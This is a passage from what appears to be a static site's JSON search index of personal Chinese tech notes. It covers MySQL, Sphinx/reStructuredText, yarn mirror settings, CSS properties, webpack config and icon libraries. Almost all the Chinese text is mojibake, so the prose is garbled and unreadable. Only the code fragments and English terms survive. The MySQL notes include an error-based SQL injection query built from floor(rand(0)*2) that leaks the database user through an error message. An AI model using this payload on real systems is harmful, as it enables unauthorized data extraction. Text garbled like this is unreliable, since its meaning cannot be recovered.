è¿™ä¸ªç»“æœä¸ºæ›´æ”¹è¯­å¥ï¼Œç›´æ¥å¤åˆ¶æ‰§è¡Œå³å¯ è¯±å¯¼æŠ¥é”™ è¯±å¯¼æŠ¥é”™: select count(*) ,concat((select user()),floor(rand(0)*2))x from information_schema.TABLES group by x; åœ¨mysql5.7ä¸­ä¼šæœ‰ä»¥ä¸‹æŠ¥é”™, 8çš„ç‰ˆæœ¬ä¸­æ²¡æœ‰å¤ç°å‡ºæ¥ è¯±å¯¼æŠ¥é”™ sqlé¢„å¤„ç† è®¾ç½®é¢„å¤„ç†è¯­å¥: EXECUTE stmt_name [USING @var_name [, @var_name] ...]; å†Œé™¤(é‡Šæ”¾)å®šä¹‰: {DEALLOCATE | DROP} PREPARE stmt_name; ä¾‹å­: # è®¾ç½®é¢„å¤„ç†è¯­å¥ prepare select_content from 'select table_name, engine from information_schema.TABLES where version = ? and table_schema= ? '; # è®¾ç½®å‚æ•° set @ver=10; set @base='information_schema'; # æ‰§è¡ŒæŸ¥è¯¢ execute select_content using @ver, @base;","tags":"æ•°æ®åº“","url":"/yq-doc-source-docs-database-mysql.html","loc":"/yq-doc-source-docs-database-mysql.html"},{"title":"mysqlæ¦‚å¿µå®šä¹‰","text":"å…³é”®å­— å…³é”®å­— å…³é”®å­—-truncate æ•°æ®ç±»å‹ æ•°æ®ç±»å‹VARCHARå’ŒCHAR åŸºç¡€ å‡½æ•°API binlog SQLå››ç§è¯­è¨€-DDL,DML,DCL,TCL å­˜å‚¨è¿‡ç¨‹ è§¦å‘å™¨ å‡½æ•°è‡ªå®šä¹‰ å¤–é”®çº¦æŸ å¤–é”®çº¦æŸï¼ˆè¡¨2ï¼‰å¯¹çˆ¶è¡¨ï¼ˆè¡¨1ï¼‰çš„å«ä¹‰: åœ¨çˆ¶è¡¨ä¸Šè¿›è¡Œupdate/deleteä»¥æ›´æ–°æˆ–åˆ é™¤åœ¨å­è¡¨ä¸­æœ‰ä¸€æ¡æˆ–å¤šæ¡å¯¹åº”åŒ¹é…è¡Œçš„å€™é€‰é”®æ—¶ï¼Œ çˆ¶è¡¨çš„è¡Œä¸ºå–å†³äºï¼šåœ¨å®šä¹‰å­è¡¨çš„å¤–é”®æ—¶æŒ‡å®šçš„on update/on deleteå­å¥ã€‚ å«ä¹‰ CASCADE åˆ é™¤åŒ…å«ä¸å·²åˆ é™¤é”®å€¼æœ‰å‚ç…§å…³ç³»çš„æ‰€æœ‰è®°å½• SET NULL ä¿®æ”¹åŒ…å«ä¸å·²åˆ é™¤é”®å€¼æœ‰å‚ç…§å…³ç³»çš„æ‰€æœ‰è®°å½•ï¼Œä½¿ç”¨NULLå€¼æ›¿æ¢(åªèƒ½ç”¨äºå·²æ ‡è®°ä¸ºNOT NULLçš„å­—æ®µ) RESTRICT æ‹’ç»åˆ é™¤è¦æ±‚ï¼Œç›´åˆ°ä½¿ç”¨åˆ é™¤é”®å€¼çš„è¾…åŠ©è¡¨è¢«æ‰‹å·¥åˆ é™¤ï¼Œå¹¶ä¸”æ²¡æœ‰å‚ç…§æ—¶(è¿™æ˜¯é»˜è®¤è®¾ç½®ï¼Œä¹Ÿæ˜¯æœ€å®‰å…¨çš„è®¾ç½®) NO ACTION å•¥ä¹Ÿä¸åš","tags":"æ•°æ®åº“","url":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-index.html","loc":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-index.html"},{"title":"docå¯ç”¨äºrstæ–‡æœ¬å…ƒç´ ","text":"è¿™æ˜¯æŒ‰ç…§æŒ‡ä»¤åˆ†ç±» Admonitions Images body-elements tables Document Parts Directives for Substitution Definitions Miscellaneous Common Options å…¬å…±é€‰é¡¹å‚æ•° class ä¸çŸ¥é“æœ‰å•¥ç”¨ name è®¾ç½®æ–¹ä¾¿å¼•ç”¨ å¦‚: .. image:: bild.png :name: my picture # å¼•ç”¨æ–¹å¼1 .. _my picture: # å¼•ç”¨æ–¹å¼2 .. image:: bild.png å‚è€ƒ: docutilsæ–‡æ¡£","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-RST-mark-language-DOC-grammar-module-index.html","loc":"/yq-doc-source-docs-document-RST-mark-language-DOC-grammar-module-index.html"},{"title":"rstè¯­æ³•æ¨¡å—","text":"æŒ‰ç…§ç”¨æ³•åˆ†ç±» æ ‡é¢˜ æ®µè½ æ–‡æœ¬æ ·å¼ æ’å…¥å›¾ç‰‡ åˆ—è¡¨ å¼•ç”¨ è¡¨æ ¼ ä¾§è¾¹æ  ä»£ç  å…¶ä»–-download downloadç”¨äºå¼•ç”¨æ–‡ä»¶åœ°å€, å¯ç‚¹å‡»ä¸‹è½½: .. download:`xxx.pdf`","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-index.html","loc":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-index.html"},{"title":"rstæ ‡è®°è¯­è¨€","text":"è¯­æ³•æ¨¡å— docè¯­æ³•æ¨¡å— å…³äºæ„å»ºä¸»é¢˜ sphinxè‡ªå®šä¹‰ä¸»é¢˜ docæ–‡æ¡£è½¬æ¢ä¸ºrst docxæ–‡ä»¶è½¬æ¢rst æ‚ä¹±æ— ç«  é—®é¢˜ sphinxä½¿ç”¨ä»‹ç»å¯å‚è€ƒ: å®˜æ–¹æ–‡æ¡£(è‹±) åœ°å€: https://www.sphinx-doc.org ç¬¬ä¸‰æ–¹ä¸­è¯‘ æ–‡æ¡£: https://daobook.github.io/sphinx/index.html æ–‡æ¡£ç›®å½•: https://daobook.github.io/sphinx/contents.html æ’ä»¶æ•™ç¨‹: https://daobook.github.io/sphinx/development/tutorials/index.html ä¸»é¢˜ä½¿ç”¨: https://daobook.github.io/sphinx/usage/theming.html ä¸»é¢˜å¼€å‘: https://daobook.github.io/sphinx/development/theming.html æ­¤æ–‡æ¡£é¡¹ç›®githubåœ°å€: https://github.com/daobook/daobook.github.io","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-RST-mark-language-index.html","loc":"/yq-doc-source-docs-document-RST-mark-language-index.html"},{"title":"ä½¿ç”¨ReadtheDocsæ‰˜ç®¡æ–‡æ¡£","text":"å…³é”®è¯:: æ–‡æ¡£ rstæ–‡æ¡£ Sphinx æ–‡æ¡£æ‰˜ç®¡ ReadtheDocs æ˜¯ä¸€ä¸ªåŸºäº Sphinx çš„å…è´¹æ–‡æ¡£æ‰˜ç®¡é¡¹ç›®. æ˜¯ä¸€ä¸ªæ¯”è¾ƒå¤§çš„æ–‡æ¡£æ‰˜ç®¡å¹³å°. éœ€è¦å…ˆæœ‰ä¸€ä¸ªæ”¯æŒSphinxæ–‡æ¡£é¡¹ç›®, ç„¶åæ‰˜ç®¡åˆ°github, ä¸”éœ€è¦å¼€æº. å» <https://readthedocs.org/dashboard/> æ³¨å†Œè´¦å·å¹¶ç™»å½•, ç„¶ååœ¨ä»ªè¡¨ç›˜å¯¼å…¥githubé¡¹ç›®å³å¯. å¦‚æœæ˜¯ä½¿ç”¨githubå…³è”ç™»å½•, å¯ä»¥ç›´æ¥çœ‹åˆ°è‡ªå·±çš„æ‰€æœ‰githubä»“åº“, é€‰æ‹©æ–‡æ¡£ä»“åº“å³å¯ æˆ–è€…é€‰æ‹©æ‰‹åŠ¨å¯¼å…¥, å¡«å†™ç›¸å…³ä¿¡æ¯:","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-RST-mark-language-question-Use-ReadTHEDOCS-hosting-document.html","loc":"/yq-doc-source-docs-document-RST-mark-language-question-Use-ReadTHEDOCS-hosting-document.html"},{"title":"ä¸€äº›å‘","text":"toctreeé€šé…ç¬¦å¤±æ•ˆ è·¨æ–‡æ¡£å¼•ç”¨é—®é¢˜ è‡ªå®šä¹‰ä¸»é¢˜ targetè­¦å‘Š æ–‡æ¡£è¶…é“¾æ¥ è·¨æ–‡æ¡£è¶…é“¾æ¥(å¼•ç”¨) å†…åµŒPDFåˆ°æ–‡æ¡£ ä¾¿æ·å¯åŠ¨æœåŠ¡ ä½¿ç”¨ReadtheDocsæ‰˜ç®¡æ–‡æ¡£","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-RST-mark-language-question-index.html","loc":"/yq-doc-source-docs-document-RST-mark-language-question-index.html"},{"title":"wiki","text":"wiki wiki.js","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-wiki-index.html","loc":"/yq-doc-source-docs-document-wiki-index.html"},{"title":"åŒ…ç®¡ç†å™¨","text":"å¸¸è§æœ‰ä¸¤ä¸ª npm yarn yarn å®‰è£…: brew install yarn yarn é»˜è®¤æ˜¯å» npm/yarn å®˜æ–¹é•œåƒæºï¼ˆå›½å¤–ï¼‰è·å–èµ„æº, è¾ƒæ…¢ æŸ¥è¯¢æº: yarn config get registry è®¾ç½®ä¸ºæ·˜å®æº: yarn config set registry https://registry.npm.taobao.org/ è¿˜åŸ: yarn config set registry https://registry.yarnpkg.com æ³¨è§£ å»ºè®®æ‰€æœ‰ä½¿ç”¨yarné…ç½®çš„é•œåƒ, å†ä½¿ç”¨npmé…ç½®ä¸€é, å› ä¸ºæœ‰äº›å·¥å…· è¿˜æ˜¯ç”¨çš„æ˜¯npmä¸‹è½½è€Œä¸æ˜¯yarn. ç¬¬ä¸‰æ–¹å·¥å…·yrmç®¡ç†é•œåƒæº å®‰è£…: npm install -g yrm åˆ—å‡ºæ‰€æœ‰é•œåƒæº: yrm ls åˆ‡æ¢é•œåƒ: yrm use taobao æ–°å¢é•œåƒ: yrm add aliyun http://maven.aliyun.com/nexus/content/groups/public åˆ é™¤é•œåƒ: yrm del taobao æµ‹è¯•å»¶è¿Ÿï¼ˆè®¿é—®é€Ÿåº¦ï¼‰: yrm test aliyun æŸ¥çœ‹å¸®åŠ©: yrm -h","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-Bag-manager.html","loc":"/yq-doc-source-docs-front-end-Bag-manager.html"},{"title":"å†…ç½®å‡½æ•°/å¯¹è±¡","text":"å†…ç½®å¯¹è±¡ navigator å­—ç¬¦ä¸²æ“ä½œ å­—ç¬¦ä¸²å‰åå‰”é™¤ trim() å‰”é™¤é¦–å°¾ç©ºæ ¼, ç±»ä¼¼äºPythonçš„ strip() trimLeft() å‰”é™¤é¦–ç©ºæ ¼ trimRight() å‰”é™¤å°¾ç©ºæ ¼ åˆ‡ç‰‡ slice(start, end) æ¥å—ä¸¤ä¸ªå‚æ•°ï¼šå¼€å§‹ç´¢å¼•å’Œç»“æŸç´¢å¼•(å¯é€‰), å®ƒä¼šè¿”å›ä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²ï¼ŒåŒ…å«ä»å¼€å§‹ç´¢å¼•åˆ°ç»“æŸç´¢å¼•ä¹‹é—´çš„å­—ç¬¦ï¼ˆä¸åŒ…æ‹¬ç»“æŸç´¢å¼•å¯¹åº”çš„å­—ç¬¦ï¼‰ã€‚ å¦‚æœçœç•¥ç»“æŸç´¢å¼•ï¼Œåˆ™ slice() æ–¹æ³•ä¼šå¤åˆ¶ä»å¼€å§‹ç´¢å¼•åˆ°å­—ç¬¦ä¸²æœ«å°¾çš„æ‰€æœ‰å­—ç¬¦ã€‚ æ•°ç»„ä¹Ÿæœ‰slice, ä½¿ç”¨ä¸€è‡´ æ•°ç»„æ“ä½œ slice(start, end) æ¥å—ä¸¤ä¸ªå‚æ•°ï¼šå¼€å§‹ç´¢å¼•å’Œç»“æŸç´¢å¼•(å¯é€‰), å®ƒä¼šè¿”å›ä¸€ä¸ªæ–°çš„æ•°ç»„ï¼ŒåŒ…å«ä»å¼€å§‹ç´¢å¼•åˆ°ç»“æŸç´¢å¼•ä¹‹é—´çš„å…ƒç´ ï¼ˆä¸åŒ…æ‹¬ç»“æŸç´¢å¼•å¯¹åº”çš„å…ƒç´ ï¼‰ã€‚ å¦‚æœçœç•¥ç»“æŸç´¢å¼•ï¼Œåˆ™ slice() æ–¹æ³•ä¼šå¤åˆ¶ä»å¼€å§‹ç´¢å¼•åˆ°æ•°ç»„æœ«å°¾çš„æ‰€æœ‰å…ƒç´ ã€‚ å­—ç¬¦ä¸²ä¹Ÿæœ‰slice, ä½¿ç”¨ä¸€è‡´","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-Built--in-function-index.html","loc":"/yq-doc-source-docs-front-end-Built--in-function-index.html"},{"title":"csså¸¸ç”¨å±æ€§","text":"align-items background background-image background-color border-radius box-shadow clip color content cursor display float justify-content margin opacity outline padding place-content position text-align transform transition place-contentã€justify-contentã€align-items å’Œ text-align åŒºåˆ« place-contentï¼šè®¾ç½® Grid å¸ƒå±€å…ƒç´ åœ¨å®¹å™¨ä¸­çš„æ°´å¹³å’Œå‚ç›´å¯¹é½æ–¹å¼ place-content å±æ€§æ˜¯ CSS Grid å¸ƒå±€çš„ä¸€ä¸ªç®€å†™å±æ€§ï¼Œ ç”¨äºåŒæ—¶è®¾ç½®å…ƒç´ åœ¨å®¹å™¨ä¸­çš„æ°´å¹³å’Œå‚ç›´æ–¹å‘ä¸Šçš„å¯¹é½æ–¹å¼ã€‚ å®ƒæ¥å—ä¸¤ä¸ªå€¼ï¼Œç¬¬ä¸€ä¸ªå€¼è¡¨ç¤ºæ°´å¹³å¯¹é½æ–¹å¼ï¼Œç¬¬äºŒä¸ªå€¼è¡¨ç¤ºå‚ç›´å¯¹é½æ–¹å¼ã€‚ ä¾‹å¦‚ï¼šplace-content: center center; è¡¨ç¤ºåœ¨å®¹å™¨ä¸­æ°´å¹³å’Œå‚ç›´æ–¹å‘ä¸Šå±…ä¸­å¯¹é½ã€‚ justify-contentï¼šè®¾ç½® Flexbox å¸ƒå±€å…ƒç´ åœ¨å®¹å™¨ä¸»è½´å’Œäº¤å‰è½´ä¸Šçš„å¯¹é½æ–¹å¼ justify-content å±æ€§ç”¨äºè®¾ç½®å…ƒç´ åœ¨å®¹å™¨çš„ä¸»è½´ï¼ˆæ°´å¹³è½´ï¼‰ä¸Šçš„å¯¹é½æ–¹å¼ã€‚ å®ƒé€‚ç”¨äºä½¿ç”¨ Flexbox å¸ƒå±€æˆ– CSS Grid å¸ƒå±€çš„å®¹å™¨ã€‚ å¸¸è§çš„å€¼åŒ…æ‹¬ flex-startï¼ˆé»˜è®¤å€¼ï¼Œå·¦å¯¹é½ï¼‰ã€flex-endï¼ˆå³å¯¹é½ï¼‰ã€ centerï¼ˆå±…ä¸­å¯¹é½ï¼‰ã€space-betweenï¼ˆä¸¤ç«¯å¯¹é½ï¼Œé¡¹ç›®ä¹‹é—´å¹³å‡åˆ†å¸ƒï¼‰ã€space-aroundï¼ˆé¡¹ç›®å‘¨å›´å¹³å‡åˆ†å¸ƒï¼‰ç­‰ã€‚ align-itemsï¼šè®¾ç½® Flexbox å¸ƒå±€å…ƒç´ åœ¨å®¹å™¨ä¸»è½´å’Œäº¤å‰è½´ä¸Šçš„å¯¹é½æ–¹å¼ align-items å±æ€§ç”¨äºè®¾ç½®å…ƒç´ åœ¨å®¹å™¨çš„äº¤å‰è½´ï¼ˆå‚ç›´è½´ï¼‰ä¸Šçš„å¯¹é½æ–¹å¼ã€‚ å®ƒé€‚ç”¨äºä½¿ç”¨ Flexbox å¸ƒå±€æˆ– CSS Grid å¸ƒå±€çš„å®¹å™¨ã€‚ å¸¸è§çš„å€¼åŒ…æ‹¬ flex-startï¼ˆé»˜è®¤å€¼ï¼Œé¡¶éƒ¨å¯¹é½ï¼‰ã€flex-endï¼ˆåº•éƒ¨å¯¹é½ï¼‰ã€ centerï¼ˆå±…ä¸­å¯¹é½ï¼‰ã€baselineï¼ˆåŸºçº¿å¯¹é½ï¼Œå…ƒç´ çš„åŸºçº¿å¯¹é½ï¼‰ç­‰ã€‚ text-alignï¼šè®¾ç½®å…ƒç´ æ¡†å†…æ–‡æœ¬å†…å®¹çš„æ°´å¹³å¯¹é½æ–¹å¼ text-align å±æ€§ç”¨äºè®¾ç½®æ–‡æœ¬å†…å®¹åœ¨å…ƒç´ æ¡†ä¸­çš„æ°´å¹³å¯¹é½æ–¹å¼ã€‚ å®ƒé€‚ç”¨äºå—çº§å…ƒç´ å’Œä¸€äº›å†…è”å…ƒç´ ã€‚ å¸¸è§çš„å€¼åŒ…æ‹¬ leftï¼ˆé»˜è®¤å€¼ï¼Œå·¦å¯¹é½ï¼‰ã€rightï¼ˆå³å¯¹é½ï¼‰ã€ centerï¼ˆå±…ä¸­å¯¹é½ï¼‰ã€justifyï¼ˆä¸¤ç«¯å¯¹é½ï¼‰ç­‰ã€‚è¯¥å±æ€§ä¸»è¦ç”¨äºè°ƒæ•´æ–‡æœ¬çš„å¯¹é½æ–¹å¼ï¼Œè€Œä¸æ˜¯å…ƒç´ æœ¬èº«ã€‚","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-index.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-index.html"},{"title":"css","text":"./å„ç§é€‰æ‹©å™¨ ./csså¸¸ç”¨å±æ€§ ./csså¸¸è§ä½¿ç”¨æŠ€å·§ ./å®½åº¦-é«˜åº¦ç™¾åˆ†æ¯”è¯´æ˜ ./å…ƒç´ çš„å‡ºåœºé¡ºåº ä¼ªç±» ä¸€äº›ä¼ªç±»é€‰æ‹©å™¨ hover: é¼ æ ‡æ‚¬åœ focus: å…ƒç´ è·å–ç„¦ç‚¹(å¦‚inputé”®ç›˜é€‰ä¸­) active: å…ƒç´ æ¿€æ´», è¿™ä¸ªæ²¡æ€ä¹ˆç†è§£ noneä¸unsetåŒºåˆ« none: æŒ‡å®šæ²¡æœ‰æ ·å¼çš„å€¼æˆ–å±æ€§. å®ƒå¸¸ç”¨äºæ¸…é™¤æˆ–ç¦ç”¨æŸä¸ªæ ·å¼å±æ€§çš„æ•ˆæœ unset: å°†æ ·å¼å±æ€§é‡ç½®ä¸ºå…¶é»˜è®¤å€¼. å®ƒä¼šå°†å±æ€§å€¼é‡ç½®ä¸ºæµè§ˆå™¨é»˜è®¤å€¼æˆ–ç»§æ‰¿å€¼ï¼Œ æ ¹æ®å…·ä½“å±æ€§çš„é»˜è®¤è¡Œä¸ºè€Œå®šã€‚ä½¿ç”¨ \"unset\" å¯ä»¥æ’¤é”€å·²åº”ç”¨çš„æ ·å¼ï¼Œå¹¶å°†å…¶æ¢å¤ä¸ºåˆå§‹çŠ¶æ€ åƒç´ å•ä½ rem rem æ˜¯ç›¸å¯¹äºæ ¹å…ƒç´ ï¼ˆå³ <html> å…ƒç´ ï¼‰çš„å­—ä½“å¤§å°æ¥è®¡ç®—çš„å•ä½ px px æ˜¯å›ºå®šçš„åƒç´ å•ä½ em ç±»ä¼¼äº remï¼Œ em ä¹Ÿæ˜¯ç›¸å¯¹äºçˆ¶å…ƒç´ çš„å­—ä½“å¤§å°è®¡ç®—çš„å•ä½ã€‚ ä¸åŒä¹‹å¤„åœ¨äºï¼Œem æ˜¯ç›¸å¯¹äºæœ€è¿‘çš„çˆ¶çº§å…ƒç´ çš„å­—ä½“å¤§å°æ¥è®¡ç®—çš„ã€‚ å¦‚æœæ²¡æœ‰æ˜¾å¼è®¾ç½®çˆ¶å…ƒç´ çš„å­—ä½“å¤§å°ï¼Œem å•ä½å°†ç»§æ‰¿è‡ªä¸Šçº§å…ƒç´ çš„å­—ä½“å¤§å°ã€‚ % ç™¾åˆ†æ¯”å•ä½æ˜¯ç›¸å¯¹äºçˆ¶å…ƒç´ çš„å°ºå¯¸æ¥è®¡ç®—çš„ã€‚ ä¾‹å¦‚ï¼Œè®¾ç½®ä¸€ä¸ªå…ƒç´ çš„å®½åº¦ä¸º 50%ï¼Œè¡¨ç¤ºè¯¥å…ƒç´ çš„å®½åº¦å°†æ˜¯å…¶çˆ¶å…ƒç´ å®½åº¦çš„ä¸€åŠã€‚ vw å’Œ vh vw å’Œ vh åˆ†åˆ«è¡¨ç¤ºè§†å£å®½åº¦ï¼ˆViewport Widthï¼‰å’Œè§†å£é«˜åº¦ï¼ˆViewport Heightï¼‰çš„ç™¾åˆ†æ¯”å•ä½ã€‚ ä¾‹å¦‚ï¼Œ1vw è¡¨ç¤ºè§†å£å®½åº¦çš„ 1%ã€‚è¿™äº›å•ä½ç”¨äºåˆ›å»ºå“åº”å¼å¸ƒå±€ï¼Œå¯ä»¥æ ¹æ®è§†å£çš„å¤§å°æ¥ç¡®å®šå…ƒç´ çš„å°ºå¯¸ã€‚ exï¼ˆç›¸å¯¹äºå°å†™å­—æ¯ \"x\" çš„é«˜åº¦ï¼‰ã€chï¼ˆç›¸å¯¹äºæ•°å­— \"0\" çš„å®½åº¦ï¼‰ç­‰ è¿™äº›å•ä½ç›¸å¯¹äºå­—ä½“ç›¸å…³çš„å°ºå¯¸è¿›è¡Œè®¡ç®—ã€‚ ç»å¯¹å•ä½ é™¤äº†ç›¸å¯¹å•ä½ï¼ŒCSS è¿˜æ”¯æŒä¸€äº›ç»å¯¹å•ä½ï¼Œå¦‚ cmï¼ˆå˜ç±³ï¼‰ã€mmï¼ˆæ¯«ç±³ï¼‰ã€inï¼ˆè‹±å¯¸ï¼‰ã€ptï¼ˆç£…ï¼‰ç­‰ã€‚ è¿™äº›å•ä½åœ¨æ‰“å°å’Œç‰©ç†åª’ä½“æ–¹é¢æ¯”è¾ƒå¸¸ç”¨ã€‚ å¯¼å…¥å…¶ä»–css æ¯”å¦‚åœ¨ theme.css ä¸­å¯¼å…¥ checkbox.css: /* theme.css */ @import url(checkbox.css); chromeæ”¯æŒå‰ç«¯æ–­ç‚¹ æ¯”å¦‚æŒ‰é’®ç‚¹å‡»åçš„æ–­ç‚¹","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-CSS-index.html","loc":"/yq-doc-source-docs-front-end-CSS-index.html"},{"title":"æ¦‚å¿µæ€§","text":"å¼‚å¸¸","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-Conceptual-index.html","loc":"/yq-doc-source-docs-front-end-Conceptual-index.html"},{"title":"ES6","text":"åŸºæœ¬ä¸Šå‚ç…§ èœé¸Ÿæ•™ç¨‹-ES6æ•™ç¨‹ ES6ï¼Œ å…¨ç§° ECMAScript 6.0 ï¼Œæ˜¯ JavaScript çš„ä¸‹ä¸€ä¸ªç‰ˆæœ¬æ ‡å‡†ï¼Œ2015.06 å‘ç‰ˆã€‚ ES6 ä¸»è¦æ˜¯ä¸ºäº†è§£å†³ ES5 çš„å…ˆå¤©ä¸è¶³ï¼Œæ¯”å¦‚ JavaScript é‡Œå¹¶æ²¡æœ‰ç±»çš„æ¦‚å¿µï¼Œ ä½†æ˜¯ç›®å‰æµè§ˆå™¨çš„ JavaScript æ˜¯ ES5 ç‰ˆæœ¬ï¼Œå¤§å¤šæ•°é«˜ç‰ˆæœ¬çš„æµè§ˆå™¨ä¹Ÿæ”¯æŒ ES6ï¼Œä¸è¿‡åªå®ç°äº† ES6 çš„éƒ¨åˆ†ç‰¹æ€§å’ŒåŠŸèƒ½ã€‚ JavaScript çš„æ­£å¼åç§°æ˜¯ ECMAScript è¯­æ³•åŸºç¡€: åŸºæœ¬æ•°æ®ç±»å‹ å˜é‡å£°æ˜ Mapä¸Set Reflectä¸Proxy å­—ç¬¦ä¸²æ“ä½œ æ•°å€¼ å¯¹è±¡ æ•°ç»„ å‡½æ•° ç±» æ¨¡å— Promise å¯¹è±¡ promise Generator å‡½æ•° async å‡½æ•° ä¸€äº›ç›¸å…³å·¥å…· Node.js Node.js æ˜¯è¿è¡Œåœ¨æœåŠ¡ç«¯çš„ JavaScriptï¼Œå®ƒå¯¹ ES6 çš„æ”¯æŒåº¦æ›´é«˜ åœ¨ Node.js ç¯å¢ƒä¸­è¿è¡Œ ES6: $ node > let sitename=\"runoob\" undefined > console.log(sitename) runoob undefined > webpack webpack æ˜¯ä¸€ä¸ªç°ä»£ JavaScript åº”ç”¨ç¨‹åºçš„é™æ€æ¨¡å—æ‰“åŒ…å™¨ (module bundler) . å½“ webpack å¤„ç†åº”ç”¨ç¨‹åºæ—¶ï¼Œå®ƒä¼šé€’å½’åœ°æ„å»ºä¸€ä¸ªä¾èµ–å…³ç³»å›¾ (dependency graph) , å…¶ä¸­åŒ…å«åº”ç”¨ç¨‹åºéœ€è¦çš„æ¯ä¸ªæ¨¡å—ï¼Œç„¶åå°†æ‰€æœ‰è¿™äº›æ¨¡å—æ‰“åŒ…æˆä¸€ä¸ªæˆ–å¤šä¸ª bundle ã€‚ webpack ä¸»è¦æœ‰å››ä¸ªæ ¸å¿ƒæ¦‚å¿µ: å…¥å£ (entry) å…¥å£ä¼šæŒ‡ç¤º webpack åº”è¯¥ä½¿ç”¨å“ªä¸ªæ¨¡å—ï¼Œæ¥ä½œä¸ºæ„å»ºå…¶å†…éƒ¨ä¾èµ–å›¾çš„å¼€å§‹. è¿›å…¥å…¥å£èµ·ç‚¹åï¼Œwebpack ä¼šæ‰¾å‡ºæœ‰å“ªäº›æ¨¡å—å’Œåº“æ˜¯å…¥å£èµ·ç‚¹ï¼ˆç›´æ¥å’Œé—´æ¥ï¼‰ä¾èµ–çš„. åœ¨ webpack ä¸­å…¥å£æœ‰å¤šç§æ–¹å¼æ¥å®šä¹‰: å•ä¸ªå…¥å£ï¼ˆç®€å†™ï¼‰ è¯­æ³•: const config = { entry: \"./src/main.js\" } å¯¹è±¡ è¯­æ³•: const config = { app: \"./src/main.js\", vendors: \"./src/vendors.js\" } è¾“å‡º (output) output å±æ€§ä¼šå‘Šè¯‰ webpack åœ¨å“ªé‡Œè¾“å‡ºå®ƒåˆ›å»ºçš„ bundles ï¼Œ ä»¥åŠå¦‚ä½•å‘½åè¿™äº›æ–‡ä»¶ï¼Œé»˜è®¤å€¼ä¸º ./dist: const config = { entry: \"./src/main.js\", output: { filename: \"bundle.js\", path: path.resolve(__dirname, 'dist') } } loader loader è®© webpack å¯ä»¥å»å¤„ç†é‚£äº›é JavaScript æ–‡ä»¶ï¼ˆ webpack è‡ªèº«åªç†è§£ JavaScript ï¼‰. loader å¯ä»¥å°†æ‰€æœ‰ç±»å‹çš„æ–‡ä»¶è½¬æ¢ä¸º webpack èƒ½å¤Ÿæœ‰æ•ˆå¤„ç†çš„æ¨¡å—ï¼Œ ä¾‹å¦‚ï¼Œå¼€å‘çš„æ—¶å€™ä½¿ç”¨ ES6 ï¼Œé€šè¿‡ loader å°† ES6 çš„è¯­æ³•è½¬ä¸º ES5 ï¼Œå¦‚ä¸‹é…ç½®: const config = { entry: \"./src/main.js\", output: { filename: \"bundle.js\", path: path.resolve(__dirname, 'dist') }, module: { rules: [ { test: /\\.js$/, exclude: /node_modules/, loader: \"babel-loader\", options: [ presets: [\"env\"] ] } ] } } æ’ä»¶ (plugins) loader è¢«ç”¨äºè½¬æ¢æŸäº›ç±»å‹çš„æ¨¡å—ï¼Œè€Œæ’ä»¶åˆ™å¯ä»¥åšæ›´å¤šçš„äº‹æƒ…. åŒ…æ‹¬æ‰“åŒ…ä¼˜åŒ–ã€å‹ç¼©ã€å®šä¹‰ç¯å¢ƒå˜é‡ç­‰ç­‰. æ’ä»¶çš„åŠŸèƒ½å¼ºå¤§ï¼Œæ˜¯ webpack æ‰©å±•éå¸¸é‡è¦çš„åˆ©å™¨ï¼Œå¯ä»¥ç”¨æ¥å¤„ç†å„ç§å„æ ·çš„ä»»åŠ¡. ä½¿ç”¨åªéœ€è¦ require() ï¼Œç„¶åæ·»åŠ åˆ° plugins æ•°ç»„ä¸­: // é€šè¿‡ npm å®‰è£… const HtmlWebpackPlugin = require('html-webpack-plugin'); // ç”¨äºè®¿é—®å†…ç½®æ’ä»¶ const webpack = require('webpack'); const config = { module: { rules: [ { test: /\\.js$/, exclude: /node_modules/, loader: \"babel-loader\" } ] }, plugins: [ new HtmlWebpackPlugin({template: './src/index.html'}) ] }; gulp åŸºäºæµçš„è‡ªåŠ¨åŒ–æ„å»ºå·¥å…·","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-ES6-index.html","loc":"/yq-doc-source-docs-front-end-ES6-index.html"},{"title":"å¼€æºå›¾æ ‡åº“","text":"codicon vscodeæœ‰ä¸ªå¼€æºå›¾æ ‡åº“ codicon , å¯åœ¨æ­¤é¢„è§ˆ: https://microsoft.github.io/vscode-codicons/dist/codicon.html ä¹Ÿæœ‰ä¸ªä»“åº“: https://github.com/microsoft/vscode-codicons/tree/main/src/icons æ²¡æ³¨æ„æ˜¯å¦ä¸€è‡´ å¤„äº†ç›´æ¥ä»ä¸Šè¿°ä»“åº“ä¸‹è½½å®Œæ•´çš„svgå›¾æ ‡, è¿˜å¯ä»¥: æ™®é€šjsé¡¹ç›® ç›´æ¥å¼•å…¥cdn: <script src=\"https://unpkg.com/vscode-codicons/dist/codicon.js\"></script> const addIcon = codicon.add; ... æˆ–è€…npmå®‰è£…: npm install vscode-codicons --save å¼•å…¥å¹¶ä½¿ç”¨: import * as codicon from 'vscode-codicons'; const addIcon = codicon.add; theiaé¡¹ç›® å¯ä»¥ç›´æ¥å¯¼å…¥ä½¿ç”¨: import {codicon} from \"@theia/core/lib/browser\" render(){ return <span className={`${codicon('add')}`}/> } fontawesome å®‰è£…å…è´¹ä½¿ç”¨çš„: yarn add @fortawesome/fontawesome-free --save é¢„è§ˆ: https://fontawesome.com/v5/search","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-Open-source-icon-library.html","loc":"/yq-doc-source-docs-front-end-Open-source-icon-library.html"},{"title":"TypeScript","text":"TypeScript å¾®è½¯å¼€å‘, è‡ªç”±ã€å¼€æºçš„ç¼–ç¨‹è¯­è¨€; æ˜¯ JavaScript çš„ä¸€ä¸ªè¶…é›† TypeScript æ˜¯ JavaScript 